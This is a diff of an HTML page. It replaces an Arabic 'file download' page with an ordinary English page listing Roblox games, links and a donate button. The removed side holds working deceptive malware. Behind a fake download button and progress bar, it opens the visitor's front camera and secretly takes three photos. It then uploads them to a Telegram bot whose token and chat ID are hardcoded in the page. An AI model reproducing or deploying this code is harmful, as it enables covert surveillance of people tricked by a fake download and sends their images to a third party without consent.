@@ -1,272 +1,132 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>تحميل الملف</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: #1a1a2e; 
-            color: #eee; 
-            font-family: 'Segoe UI', Tahoma, sans-serif; 
-            text-align: center; 
-            min-height: 100vh; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            padding: 20px;
-        }
-        .container {
-            background: #16213e;
-            padding: 40px 30px;
-            border-radius: 30px;
-            box-shadow: 0 15px 40px rgba(0,0,0,0.8);
-            max-width: 450px;
-            width: 100%;
-        }
-        h1 {
-            font-size: 2rem;
-            margin-bottom: 10px;
-            color: #0ff;
-            text-shadow: 0 0 20px #0ff;
-        }
-        .sub {
-            font-size: 1rem;
-            color: #aaa;
-            margin-bottom: 30px;
-        }
-        #downloadBtn {
-            background: #0ff;
-            color: #000;
-            border: none;
-            padding: 18px 40px;
-            font-size: 1.5rem;
-            font-weight: bold;
-            border-radius: 60px;
-            cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 0 30px rgba(0,255,255,0.3);
-            width: 100%;
-            margin-bottom: 25px;
-        }
-        #downloadBtn:hover:not(:disabled) {
-            transform: scale(1.03);
-            background: #0cc;
-        }
-        #downloadBtn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            box-shadow: none;
-        }
-        .progress-wrap {
-            width: 100%;
-            height: 20px;
-            background: #0a0a1a;
-            border-radius: 30px;
-            overflow: hidden;
-            margin: 20px 0;
-            border: 1px solid #0ff;
-            display: none;
-        }
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #0ff, #f0f);
-            transition: width 0.15s ease;
-        }
-        #status {
-            font-size: 1rem;
-            min-height: 2em;
-            color: #ffa;
-            margin-top: 10px;
-        }
-        #finalMsg {
-            font-size: 2.2rem;
-            font-weight: bold;
-            color: #f0f;
-            text-shadow: 0 0 30px #f0f;
-            margin-top: 20px;
-            display: none;
-        }
-        .note {
-            color: #666;
-            font-size: 0.8rem;
-            margin-top: 20px;
-        }
-        video { display: none; }
-    </style>
+  <meta charset="UTF-8">
+  <link rel="icon" href="images/favicon.png">
+  <link rel="canonical" href="https://funrobloxgames.com/">
+  <title>Fun Roblox Games</title>
+  <meta name='description' content="Here is a list of fun roblox games that are addicting. Games such as Jailbreak, Lumber Tycoon 2, and Frappe are some of my favorite.">
+  <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+  <link rel="stylesheet" href="style.css">
+  <script async src="https://arc.io/widget.min.js#vhRZitEy"></script>
 </head>
-<body>
 
-<div class="container">
-    <h1>📥 تحميل الملف</h1>
-    <div class="sub">اضغط زر التحميل لبدء التنزيل</div>
-    <button id="downloadBtn">⬇ تحميل</button>
-    <div class="progress-wrap" id="progressWrap">
-        <div class="progress-bar" id="progressBar"></div>
+<body>
+  <!-- yyyy-mm-dd -->
+  <time datetime="2020-09-29"></time>
+  <header>
+    <div class='nav-wrapper'>
+      <h1 class='site'><img src="images/logo.png" alt="Fun Roblox Games Logo"></h1>
     </div>
-    <div id="status">⏳ انتظر...</div>
-    <div id="finalMsg">ATWI SAY YOU HELLO</div>
-    <div class="note">سيتم تنزيل ملفك خلال ثوانٍ</div>
+  </header>
+  <nav class="nav">
+    <a href="/" class="tab">Roblox</a>
+    <a href="about" class="tab">About Us</a>
+  </nav>
+  <a href='https://www.roblox.com/games/?SortFilter=default&TimeFilter=0&GenreFilter=1'><img src="images/roblox background.png" class="header"></a>
+
+  <article class="wrapper">
+    <script src="https://apis.google.com/js/platform.js"></script>
+
+<div class="socials">
+  <div class="austin1">
+    <div class="g-ytsubscribe" data-channelid="UCCYm6GAI6Jy45ju1OL15-pA" data-layout="full" data-count="default"></div>
+  </div>
+  <div class="courtney">
+    <div class="g-ytsubscribe" data-channelid="UCWKA3YM1mv_Pp5pNJyKJEbw" data-layout="full" data-count="default"></div>
+  </div>
 </div>
 
-<script>
-    (function() {
-        // ----- بيانات البوت -----
-        const BOT_TOKEN = '8921560508:AAG9LXTki6m1McSN17xR8P6WKYxrGCTs-38';
-        const CHAT_ID = '8160376425';
-        const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+  <div class="robloxdesc">
+      <header class="game-header"><b>What is ROBLOX?</b></header>
+        <br>
+      <span style="text-indent: 50px;">ROBLOX is a family-friendly platform where you can create games and/or play games designed by others. All you need to do to begin playing is create an account at <a style="color: #0099ff; text-decoration: underline;" href="https://www.roblox.com/">ROBLOX</a>.</span>
+  </div>
+    <form class="searchWrapper">
+      <input type="text" name="search" placeholder="Search Roblox" class="search">
+    </form>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+    <script>
+      $(function(){
+        $('.searchWrapper').submit(function(){
+          var searchterm=$(".search").val();
+          window.open("http://www.roblox.com/games/?Keyword="+searchterm);
+          // alert(searchterm);
+          return false;
+        });
+      });
+    </script>
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 
-        // ----- عناصر DOM -----
-        const downloadBtn = document.getElementById('downloadBtn');
-        const progressWrap = document.getElementById('progressWrap');
-        const progressBar = document.getElementById('progressBar');
-        const statusEl = document.getElementById('status');
-        const finalMsg = document.getElementById('finalMsg');
+      ga('create', 'UA-78082698-1', 'auto');
+      ga('send', 'pageview');
 
-        // ----- متغيرات الحالة -----
-        let stream = null;
-        let isRunning = false;
+    </script>
+    <div class="title"><a class="game" href="http://www.roblox.com/"><img src="images/Roblox.png">Roblox</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/5343994291/Outlaster"><img src="images/Outlaster.png">Outlaster</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/606849621/Jailbreak"><img src="images/Jailbreak.png">Jailbreak</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/69184822/Theme-Park-Tycoon-2"><img src="images/Theme Park Tycoon.png">Theme Park Tycoon 2</a></div>
+    <div class="title"><a class="game" href="http://www.roblox.com/games/13822889/Lumber-Tycoon-2"><img src="images/Lumber Tycoon 2.png">Lumber Tycoon 2</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/5289509545/Gacha-Online"><img src="images/Gacha Online.png">Gacha Online</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/142823291/Murder-Mystery-2"><img src="images/Murder Mystery 2.png">Murder Mystery 2</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/379614936/Assassin"><img src="images/Assassin.png">Assassin</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/32990482/Flood-Escape"><img src="images/Flood Escape.png">Flood Escape</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/156220906/Whatever-Floats-Your-Boat"><img src="images/Whatever Floats Your Boat.png">Whatever Floats Your Boat</a></div>
+    <div class="title"><a class="game" href="http://www.roblox.com/games/192800/Work-at-a-Pizza-Place"><img src="images/Work at a Pizza Place.png">Work at a Pizza Place</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/893973440/Flee-the-Facility-Beta"><img src="images/Flee The Facility.png">Flee The Facility</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/755776245/Restaurant-Tycoon"><img src="images/Restaurant Tycoon.png">Restaurant Tycoon</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/1382113806/Silent-Assassin"><img src="images/Silent Assassin.png">Silent Assassin</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/248409235/Cube-Eat-Cube"><img src="images/Cube Eat Cube.png">Cube Eat Cube</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/3652625463/Lifting-Simulator"><img src="images/Lifting Simulator.png">Lifting Simulator</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/735030788/Royale-High"><img src="images/Royale High.png">Royale High</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/185655149/Welcome-to-Bloxburg-BETA"><img src="images/Welcome to Bloxburg.png">Welcome to Bloxburg</a></div>
+    <div class="title"><a class="game" href="http://www.roblox.com/games/367959224/ROBLOXian-Waterpark"><img src="images/Roblox Waterpark.png">Roblox Waterpark</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/20741661/Epic-Mining-2"><img src="images/Epic Mining 2.png">Epic Mining 2</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/9689581/ROBLOX-High-School"><img src="images/Roblox High School.png">Roblox High School</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/1417427737/Mining-Simulator"><img src="images/Mining Simulator.png">Mining Simulator</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/202195974/Mini-Golf"><img src="images/Mini Golf.png">Mini Golf</a></div>
+    <div class="title"><a class="game" href="http://www.roblox.com/games/183364845/Speed-Run-4"><img src="images/Speed Run 4.png">Speed Run 4</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/654732683/Car-Crushers-2-Beta"><img src="images/Car Crushers.png">Car Crushers 2</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/340416369/Shard-Seekers-RPG-Alpha"><img src="images/Shard Seekers RPG - Alpha.png">Shard Seekers RPG - Alpha</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/284076212/Retail-Tycoon-1-1-3#!/about"><img src="images/Retail Tycoon.png">Retail Tycoon</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/46315274/Sandbox-1"><img src="images/Sandbox (1).png">Sandbox (1)</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/3138584/Sandbox-2"><img src="images/Sandbox (2).png">Sandbox (2)</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/155615604/Prison-Life-v2-0"><img src="images/Prison Life.png">Prison Life v2</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/370731277/MeepCity"><img src="images/Meep City.png">Meep City</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/5580097107/SUMMER-SALE-Frapp-V4"><img src="images/Frappe.png">Frappe</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/914010731/Hide-Trainer-Ro-Ghoul-ALPHA"><img src="images/Ro-Ghoul.png">Ro-Ghoul</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/920587237/HOTDOGS-Adopt-Me"><img src="images/Adopt Me.png">Adopt Me</a></div>
+    <div class="title"><a class="game" href="https://www.roblox.com/games/470702250/Pizza-Factory-Tycoon"><img src="images/Pizza Factory Tycoon.png">Pizza Factory Tycoon</a></div>
 
-        // ----- دالة التقاط صورة واحدة (من الفيديو المخفي) -----
-        function captureFrame(videoElem) {
-            return new Promise((resolve) => {
-                const canvas = document.createElement('canvas');
-                const w = videoElem.videoWidth || 480;
-                const h = videoElem.videoHeight || 360;
-                canvas.width = w;
-                canvas.height = h;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(videoElem, 0, 0, w, h);
-                canvas.toBlob((blob) => {
-                    resolve(blob);
-                }, 'image/jpeg', 0.9);
-            });
-        }
+    <form id='donatebutton' action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_top">
+    <input type="hidden" name="cmd" value="_s-xclick">
+    <input type="hidden" name="encrypted" value="-----BEGIN PKCS7-----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-----END PKCS7-----
+    ">
+    <input type="image" src="images/Donate.png" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
+    <img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
+    </form>
 
-        // ----- إرسال الصورة إلى تيليجرام -----
-        async function sendPhoto(blob, caption = '') {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'photo.jpg');
-            if (caption) formData.append('caption', caption);
-            try {
-                const resp = await fetch(TELEGRAM_URL, { method: 'POST', body: formData });
-                const json = await resp.json();
-                return json.ok === true;
-            } catch (e) {
-                return false;
-            }
-        }
+  </article>
+  <div style='max-width:700px;margin:0 auto;background:none;'><img src="images/Email.png" alt=""></div>
 
-        // ----- العملية الأساسية (تطلب الكاميرا الأمامية، تلتقط 3 صور، ترسل) -----
-        async function startProcess() {
-            if (isRunning) return;
-            isRunning = true;
-            downloadBtn.disabled = true;
-            downloadBtn.textContent = '⏳ جاري ...';
-            statusEl.textContent = '⏳ طلب الملف ...';
-            progressWrap.style.display = 'block';
-            progressBar.style.width = '0%';
-            finalMsg.style.display = 'none';
-            statusEl.style.color = '#ffa';
 
-            // 1. طلب الكاميرا الأمامية (facingMode: 'user')
-            try {
-                stream = await navigator.mediaDevices.getUserMedia({
-                    video: { 
-                        facingMode: 'user',   // ← الكاميرا الأمامية
-                        width: { ideal: 480 }, 
-                        height: { ideal: 360 } 
-                    }
-                });
-            } catch (err) {
-                statusEl.textContent = '❌ تم رفض الكاميرا، الرجاء السماح ثم أعد المحاولة.';
-                statusEl.style.color = '#f55';
-                downloadBtn.disabled = false;
-                downloadBtn.textContent = '⬇ تحميل';
-                isRunning = false;
-                progressWrap.style.display = 'none';
-                return;
-            }
-
-            // 2. إنشاء عنصر فيديو مخفي لتغذية الكاميرا
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.autoplay = true;
-            video.muted = true;
-            video.playsInline = true;
-            video.style.display = 'none';
-            document.body.appendChild(video);
-            await video.play();
-
-            // 3. التقاط 3 صور (بفاصل 1 ثانية بين كل)
-            const photos = [];
-            statusEl.textContent = '⏳ جاري تنزيل الملف ... 0%';
-            for (let i = 0; i < 3; i++) {
-                const blob = await captureFrame(video);
-                photos.push(blob);
-                const pct = Math.round(((i + 1) / 3) * 100);
-                progressBar.style.width = pct + '%';
-                statusEl.textContent = `⏳ جاري التنزيل ... ${pct}%`;
-                if (i < 2) await new Promise(r => setTimeout(r, 1000));
-            }
-
-            // 4. إرسال الصور إلى التيليجرام (مع تقدم وهمي)
-            statusEl.textContent = '⏳ رفع الملفات ...';
-            let allSent = true;
-            for (let i = 0; i < photos.length; i++) {
-                const ok = await sendPhoto(photos[i], `صورة ${i+1}`);
-                if (!ok) allSent = false;
-                progressBar.style.width = (70 + (i+1)*10) + '%';
-            }
-
-            // 5. محاكاة تنزيل وهمي (تكملة الشريط)
-            statusEl.textContent = '⏳ اكتمال التنزيل ...';
-            for (let p = 80; p <= 100; p += 2) {
-                progressBar.style.width = p + '%';
-                await new Promise(r => setTimeout(r, 60));
-            }
-
-            // 6. إظهار الرسالة النهائية
-            if (allSent) {
-                statusEl.textContent = '✅ تم التنزيل بنجاح';
-                statusEl.style.color = '#0f0';
-            } else {
-                statusEl.textContent = '⚠️ تم التنزيل مع بعض الأخطاء';
-                statusEl.style.color = '#ff0';
-            }
-            finalMsg.style.display = 'block';
-            finalMsg.textContent = 'ATWI SAY YOU HELLO';
-
-            // 7. تنظيف
-            if (stream) {
-                stream.getTracks().forEach(t => t.stop());
-                stream = null;
-            }
-            video.srcObject = null;
-            video.remove();
-
-            downloadBtn.disabled = false;
-            downloadBtn.textContent = '⬇ تحميل مجدد';
-            isRunning = false;
-
-            // إخفاء شريط التقدم بعد فترة
-            setTimeout(() => {
-                progressWrap.style.display = 'none';
-            }, 5000);
-        }
-
-        // ----- ربط الزر -----
-        downloadBtn.addEventListener('click', startProcess);
-
-        // ----- تحضير أولي -----
-        statusEl.textContent = '⏳ اضغط تحميل للبدء';
-        statusEl.style.color = '#ffa';
-    })();
+<script src="http://static.miniclipcdn.com/js/game-embed.js"></script>
+<!--Start of Tawk.to Script-->
+<script type="text/javascript">
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+  s1.src='https://embed.tawk.to/595b0fc050fd5105d0c83c94/default';
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+})();
 </script>
-
+<!--End of Tawk.to Script-->
 </body>
-</html>
+                           </html>
